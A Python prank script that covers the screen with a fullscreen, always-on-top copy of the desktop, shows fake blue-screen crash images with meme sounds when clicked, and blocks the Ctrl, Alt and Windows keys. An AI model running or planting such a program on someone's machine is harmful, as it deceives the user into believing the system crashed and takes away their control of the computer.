import tkinter as tk
import time
import pyautogui
import os, sys
from PIL import Image,ImageTk
import keyboard
import winsound


dir = os.path.dirname(os.path.abspath(sys.argv[0]))

ISRUN = False

#time.sleep(5)
pyautogui.hotkey("win", "d")
time.sleep(0.7)
im = pyautogui.screenshot("desktop.png")

root = tk.Tk()
root.geometry("{}x{}+0+0".format(root.winfo_screenwidth(),
                                 root.winfo_screenheight()))

bg = tk.PhotoImage(file="desktop.png")
bgimage = tk.Label(root, image=bg, width=root.winfo_screenwidth(),
                   height=root.winfo_screenheight(), borderwidth=0)
bgimage.place(x=0, y=0)

root.attributes("-fullscreen", True)
root.attributes("-topmost", True)

def updateImg(number, sleepNum):
    imgName = dir+"/bsod" + str(number) + ".png"
    img = Image.open(imgName).resize(
        (root.winfo_screenwidth(), root.winfo_screenheight()), Image.LANCZOS)
    bg1 = ImageTk.PhotoImage(img)
    bgimage.configure(image=bg1, cursor="none")
    bgimage.image = bg1
    root.update()
    time.sleep(2)
    time.sleep(sleepNum)


def initiate(e):
    global ISRUN
    if ISRUN == False:
        ISRUN = True
        time.sleep(1)
        updateImg(1, 4)
        winsound.PlaySound(dir + '/noise1.wav', winsound.SND_ASYNC)
        updateImg(2, 6)
        winsound.PlaySound(dir + '/error.wav', winsound.SND_ASYNC)
        updateImg(3, 7)
        winsound.PlaySound(dir + '/error2.wav', winsound.SND_ASYNC)
        updateImg(4, 0.01)
        winsound.PlaySound(dir + '/bass-boost-discord-call.wav', winsound.SND_ASYNC)
        updateImg(5, 2)
        updateImg(6, 5)
        winsound.PlaySound(dir + '/dexter-meme.wav', winsound.SND_ASYNC)
        updateImg(7, 3)
        updateImg(8, 10)
        winsound.PlaySound(dir +'/windows-xp-distorted', winsound.SND_LOOP + winsound.SND_ASYNC)
        updateImg(9, 15)
bgimage.bind("<Button-1>", initiate)

keyboard.block_key('ctrl')
keyboard.block_key('left ctrl')
keyboard.block_key('right ctrl')
keyboard.block_key('alt')
keyboard.block_key('left alt')
keyboard.block_key('right alt')
keyboard.block_key('win')





root.mainloop()